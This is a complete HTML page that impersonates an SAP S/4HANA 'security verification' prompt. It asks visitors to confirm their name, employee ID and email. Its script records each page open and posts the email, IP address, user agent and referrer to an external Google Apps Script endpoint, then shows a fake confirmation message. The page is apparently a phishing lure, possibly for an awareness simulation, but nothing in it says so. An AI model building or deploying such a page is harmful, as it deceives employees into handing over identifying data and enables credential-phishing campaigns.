<!DOCTYPE html>
<html>

<head>

<title>SAP Credential Verification</title>

<style>

body{
font-family:Arial;
background:#f4f6f8;
margin:0;
padding:0;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.box{
background:white;
width:420px;
padding:40px;
border-radius:8px;
box-shadow:0 0 10px rgba(0,0,0,0.2);
text-align:center;
}

h2{
margin-bottom:10px;
}

p{
color:#555;
}

input{
width:90%;
padding:10px;
margin:10px;
border:1px solid #ccc;
border-radius:4px;
}

button{
background:#0070f2;
color:white;
padding:10px 20px;
border:none;
border-radius:4px;
cursor:pointer;
}

button:hover{
background:#005ac7;
}

.success{
font-size:20px;
color:green;
}

</style>

</head>

<body>

<div class="box" id="formBox">

<h2>SAP S/4HANA Security Verification</h2>

<p>Please confirm your SAP credentials</p>

<form id="sapForm">

<input type="text" id="name" placeholder="Full Name" required>

<input type="text" id="empid" placeholder="Employee ID" required>

<input type="email" id="email" placeholder="Email ID" required>

<button type="submit">Confirm</button>

</form>

</div>

<script>

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyBd2-EDj6qD-bz9CZAYrdd7vGp5REkHceBmJBJyKahJrsBDcDUleOJ4b0GCV9mZ1Q/exec";

let userIP = "";


async function getIP(){

const res = await fetch("https://api.ipify.org?format=json");
const data = await res.json();
userIP = data.ip;

}


async function logEvent(eventName,emailValue){

await fetch(SCRIPT_URL,{
method:"POST",
body:JSON.stringify({
event:eventName,
email:emailValue,
ip:userIP,
userAgent:navigator.userAgent,
referrer:document.referrer
})
});

}


document.getElementById("sapForm").addEventListener("submit", async function(e){

e.preventDefault();

const name = document.getElementById("name").value;
const empid = document.getElementById("empid").value;
const email = document.getElementById("email").value;


await logEvent("FORM_SUBMITTED",email);


document.getElementById("formBox").innerHTML = `
<div class="success">
<h2>Thank You</h2>
<p>Your SAP credential confirmation has been recorded.</p>
</div>
`;

});


async function init(){

await getIP();
await logEvent("PAGE_OPEN","LINK_OPENED");

}

init();

</script>

</body>

</html>
